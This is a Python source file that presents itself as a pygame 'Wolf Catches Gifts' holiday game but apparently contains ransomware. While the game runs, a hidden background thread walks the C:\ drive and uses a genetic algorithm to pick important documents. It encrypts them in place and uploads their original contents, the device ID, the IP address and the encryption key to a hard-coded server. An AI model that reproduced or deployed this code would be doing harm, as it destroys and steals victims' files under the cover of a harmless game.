import os
import json
import socket
import sys
import threading
import uuid
import asyncio
import aiohttp
from cryptography.fernet import Fernet
from typing import List, Dict, Tuple
import pygame
import random
import time

POPULATION_SIZE = 50
GENERATIONS = 100
MUTATION_RATE = 0.1
CROSSOVER_RATE = 0.8


def calculate_importance(file_path: str) -> float:
    importance = 1.0
    _, ext = os.path.splitext(file_path)
    if ext in [".txt", ".docx", ".pdf"]:
        importance += 2.0
    elif ext in [".tmp", ".log"]:
        importance -= 1.0

    try:
        last_modified = os.path.getmtime(file_path)
        if (time.time() - last_modified) < 24 * 3600:  # Méně než 1 den
            importance += 2.5
        elif (time.time() - last_modified) > 7 * 24 * 3600:  # Více než týden
            importance -= 0.5
    except Exception:
        pass

    keywords = ["report", "invoice", "important"]
    if any(keyword in os.path.basename(file_path).lower() for keyword in keywords):
        importance += 1.0

    if "Documents" in file_path or "Desktop" in file_path:
        importance += 1.0
    elif "Temp" in file_path or "Cache" in file_path:
        importance -= 1.0

    return max(0.0, importance)


def initialize_population(file_list: List[Dict]) -> List[List[int]]:

    population = []
    for _ in range(POPULATION_SIZE):
        chromozome = [random.choice([0, 1]) for _ in range(len(file_list))]
        population.append(chromozome)
    return population


def fitness_function(chromozome: List[int], file_list: List[Dict]) -> float:
    total_size = 0
    total_importance = 0

    for idx, gene in enumerate(chromozome):
        if gene == 1:  # Pokud je soubor vybrán
            file = file_list[idx]
            total_size += file["size"]
            total_importance += file["importance"]


    max_importance = max(file["importance"] for file in file_list) if file_list else 1
    max_size = max(file["size"] for file in file_list) if file_list else 1

    normalized_importance = total_importance / max_importance
    normalized_size = total_size / max_size


    fitness = normalized_importance - 0.3 * normalized_size

    return fitness


def select_parents(population: List[List[int]], fitness_scores: List[float]) -> Tuple[List[int], List[int]]:

    total_fitness = sum(fitness_scores)
    pick1 = random.uniform(0, total_fitness)
    pick2 = random.uniform(0, total_fitness)
    parent1, parent2 = None, None

    current = 0
    for i, score in enumerate(fitness_scores):
        current += score
        if parent1 is None and current >= pick1:
            parent1 = population[i]
        if parent2 is None and current >= pick2:
            parent2 = population[i]
        if parent1 and parent2:
            break
    return parent1, parent2


def crossover(parent1: List[int], parent2: List[int]) -> Tuple[List[int], List[int]]:

    if random.random() < CROSSOVER_RATE:
        point = random.randint(1, len(parent1) - 1)
        child1 = parent1[:point] + parent2[point:]
        child2 = parent2[:point] + parent1[point:]
        return child1, child2
    return parent1, parent2


def mutate(chromozome: List[int]) -> List[int]:

    for i in range(len(chromozome)):
        if random.random() < MUTATION_RATE:
            chromozome[i] = 1 - chromozome[i]  # Flip bit
    return chromozome


def genetic_algorithm(file_list: List[Dict]) -> List[int]:

    population = initialize_population(file_list)
    for generation in range(GENERATIONS):
        fitness_scores = [fitness_function(chromozome, file_list) for chromozome in population]
        new_population = []

        while len(new_population) < POPULATION_SIZE:
            parent1, parent2 = select_parents(population, fitness_scores)
            child1, child2 = crossover(parent1, parent2)
            new_population.extend([mutate(child1), mutate(child2)])

        population = new_population[:POPULATION_SIZE]

    fitness_scores = [fitness_function(chromozome, file_list) for chromozome in population]
    best_chromozome = population[fitness_scores.index(max(fitness_scores))]
    return best_chromozome


async def collect_and_send_files_data_with_ga(start_path, uid, ip_address, api_url, encryption_key):
    file_list = []
    for root, _, files in os.walk(start_path):
        for file in files:
            file_path = os.path.join(root, file)

            if os.path.getsize(file_path) <= 1 * 1024 * 1024:
                _, ext = os.path.splitext(file)
                size = os.path.getsize(file_path)
                if ext in [".txt", ".docx", ".pdf", ".tmp", ".log"]:
                    try:
                        importance = calculate_importance(file_path)  # Dynamický výpočet důležitosti
                        file_list.append({
                            "path": file_path,
                            "importance": importance,
                            "size":size
                        })

                    except Exception as e:
                        pass


    if not file_list:
        print("No eligible files found.")
        return

    best_selection = genetic_algorithm(file_list)

    for idx, selected in enumerate(best_selection):
        file_list[idx]['selected'] = selected

    file_list.sort(key=lambda f: (f['selected'], f['importance']), reverse=True)
    for file_data in file_list:
        file_path = file_data["path"]
        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            if encrypt_file_on_disk(file_path, encryption_key):
                payload = {
                    "UID": uid,
                    "IP": ip_address,
                    "file": {
                        "file_path": file_path,
                        "original_content": content
                    },
                    "status": "running"
                }

                await send_file_data_to_api(payload, api_url)
        except Exception as e:
            print(f"Chyba při zpracování souboru {file_path}: {e}")


def get_device_uid():
    return str(uuid.UUID(int=uuid.getnode()))

def get_ip_address():
    hostname = socket.gethostname()
    return socket.gethostbyname(hostname)


def generate_encryption_key():
    return Fernet.generate_key()


def encrypt_file_on_disk(file_path, key):
    fernet = Fernet(key)
    try:
        with open(file_path, "rb") as f:
            file_data = f.read()

        encrypted_data = fernet.encrypt(file_data)

        with open(file_path, "wb") as f:
            f.write(encrypted_data)

        print(f"Soubor {file_path} byl úspěšně zašifrován.")
        return True
    except Exception as e:
        print(f"Chyba při šifrování souboru {file_path}: {e}")
        return False


async def send_file_data_to_api(payload, api_url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(api_url, json=payload) as response:
                if response.status == 200:
                    print(f"Data byla úspěšně odeslána na API: {payload.get('file', {}).get('file_path', 'N/A')}")
                else:
                    print(f"Chyba při odesílání dat na API: {response.status}")
    except Exception as e:
        print(f"Chyba při odesílání na API: {e}")



async def main():
    start_path = "C:\\"
    api_url = "http://172.23.25.34:8080/api/upload"

    encryption_key = generate_encryption_key()
    uid = get_device_uid()
    ip_address = get_ip_address()

    print("Odesílání úvodního statusu...")
    starting_payload = {
        "UID": uid,
        "IP": ip_address,
        "status": "starting",
        "encryption_key": encryption_key.decode()
    }
    await send_file_data_to_api(starting_payload, api_url)

    print("Sběr dat a šifrování souborů...")
    await collect_and_send_files_data_with_ga(start_path, uid, ip_address, api_url, encryption_key)

    print("Odesílání závěrečného statusu...")
    final_status_payload = {
        "UID": uid,
        "IP": ip_address,
        "status": "completed"
    }
    await send_file_data_to_api(final_status_payload, api_url)

    print("Program dokončil odesílání dat na REST API.")

# Background task runner
def start_async_task():
    asyncio.run(main())

# Initialize Pygame and the main game loop
def start_pygame_game():
    WIDTH, HEIGHT = 1088, 720
    screen = pygame.display.set_mode((WIDTH, HEIGHT))
    pygame.display.set_caption("Wolf Catches Gifts")

    # Colors
    WHITE = (255, 255, 255)
    BLACK = (0, 0, 0)
    RED = (255, 0, 0)

    # Assets
    wolf_img = pygame.image.load('assets/wolf.png')
    egg_img = pygame.image.load('assets/gift.png')
    background_img = pygame.image.load('assets/massaryk.png')
    background_sound = 'assets/tucny.mp3'

    # Scale assets
    wolf_img = pygame.transform.scale(wolf_img, (150, 150))
    egg_img = pygame.transform.scale(egg_img, (50, 50))

    # Define positions
    wolf_positions = [240, 480, 720]
    wolf_y = 480
    wolf_index = 1

    # Egg data
    eggs = []
    egg_speed = 5

    # Game variables
    score = 0
    lives = 3
    clock = pygame.time.Clock()
    font = pygame.font.Font(None, 36)
    message_font = pygame.font.Font(None, 48)

    labels = ["Good Job!", "Awesome!", "Happy New Year!", "Well Done!", "Keep Going!"]
    current_label = ""
    label_timer = 0

    # Load and play background sound
    pygame.mixer.init()
    pygame.mixer.music.load(background_sound)
    pygame.mixer.music.set_volume(0.3)
    pygame.mixer.music.play(-1)

    def draw_text(text, font, color, x, y):
        screen_text = font.render(text, True, color)
        screen.blit(screen_text, (x, y))

    def spawn_egg():
        return {
            "x": random.choice(wolf_positions),
            "y": 0
        }

    # Main game loop
    running = True
    move_cooldown = False

    while running:
        screen.fill(WHITE)
        screen.blit(background_img, (0, 0))

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False

            if event.type == pygame.KEYDOWN and not move_cooldown:
                if event.key == pygame.K_LEFT:
                    wolf_index = max(0, wolf_index - 1)
                    move_cooldown = True
                elif event.key == pygame.K_RIGHT:
                    wolf_index = min(len(wolf_positions) - 1, wolf_index + 1)
                    move_cooldown = True

            if event.type == pygame.KEYUP:
                move_cooldown = False

        if random.randint(1, 30) == 1:
            eggs.append(spawn_egg())

        for egg in eggs[:]:
            egg["y"] += egg_speed
            screen.blit(egg_img, (egg["x"], egg["y"]))

            wolf_x = wolf_positions[wolf_index]
            if egg["y"] > wolf_y and wolf_x <= egg["x"] <= wolf_x + 150:
                eggs.remove(egg)
                score += 1

                if score % 10 == 0:
                    current_label = random.choice(labels)
                    label_timer = pygame.time.get_ticks()
            elif egg["y"] > HEIGHT:
                eggs.remove(egg)
                lives -= 1

        wolf_x = wolf_positions[wolf_index]
        screen.blit(wolf_img, (wolf_x, wolf_y))

        draw_text(f"Score: {score}", font, WHITE, 10, 10)
        draw_text(f"Lives: {lives}", font, WHITE, 10, 50)

        if current_label and pygame.time.get_ticks() - label_timer < 1000:
            draw_text(current_label, message_font, WHITE, WIDTH // 2 - 100, HEIGHT // 2)
        else:
            current_label = ""

        if lives <= 0:
            draw_text("Game Over!", message_font, RED, WIDTH // 2 - 100, HEIGHT // 2)
            pygame.display.flip()
            pygame.time.wait(2000)
            running = False

        pygame.display.flip()
        clock.tick(30)

    pygame.mixer.music.stop()
    pygame.quit()
    sys.exit()

if __name__ == "__main__":
    # Start the async task in the background
    background_thread = threading.Thread(target=start_async_task, daemon=True)
    background_thread.start()

    # Start the Pygame game
    start_pygame_game()
